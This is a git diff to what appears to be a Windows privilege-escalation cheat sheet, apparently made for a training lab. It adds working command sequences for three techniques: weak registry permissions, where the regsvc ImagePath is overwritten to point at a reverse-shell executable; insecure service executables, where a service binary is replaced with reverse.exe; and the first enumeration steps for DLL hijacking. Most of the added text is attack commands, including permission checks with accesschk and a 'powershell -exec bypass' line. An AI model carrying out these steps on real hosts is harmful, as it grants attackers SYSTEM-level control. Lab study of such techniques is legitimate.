@@ -717,7 +717,7 @@ net start {SERVICE}
 .\accesschk.exe /accepteula -uwcqv user {SERVICE}
 
 # Verify permissions of to write using accesschk
-.\accesschk.exe /accepteula -uwcqv {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\"}
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\UnquotedPath Service\"
 
 # Copy payload to unquoted service path break point
 copy reverse.exe {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\Common.exe"}
@@ -725,11 +725,61 @@ copy reverse.exe {BINARY PATH: ex. "C:\Program Files\Unquoted Path Service\Commo
 # Start a service:
 net start {SERVICE}
 
+
+
 # 3. Weak Registry Permissions
 
-# 4. Insecure Service Executables
+# Check regsvc for weak entries using powershell
+powershell -exec bypass
+
+Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+
+# Check regsvc for weak entries using accesschk
+.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+# Verify permissions of to start service using accesschk
+.\accesschk.exe /accepteula -uwcqv user regsvc
+
+# Check current values in registry entry
+reg query HKLM:\System\CurrentControlSet\Services\regsvc
+
+# Overwrite the imagePath registry key to point to reverse shell
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\{PAYLOAD PATH ex. C:\PrivEsc\reverse.exe} /f
+
+# Start the service:
+net start regsvc
+
+
+
+
+# 4. Insecure Service Executables (File Permissions: Everyone)
+
+
+# Verify permissions of a service using accesschk
+.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+# Verify permissions of to start service using accesschk
+.\accesschk.exe /accepteula -uvqc filepermsvc
+
+# Copy the reverse shell executable to overwrite the service executable
+copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+# Start the service
+net start filepermsvc
+
 
 # 5. DLL Hijacking
+
+# Verify permissions of to start service using accesschk
+.\accesschk.exe /accepteula -uvqc dllsvc
+
+# Query the service
+sc qc dllsvc
+
+
+
+
+
 ```
 
 
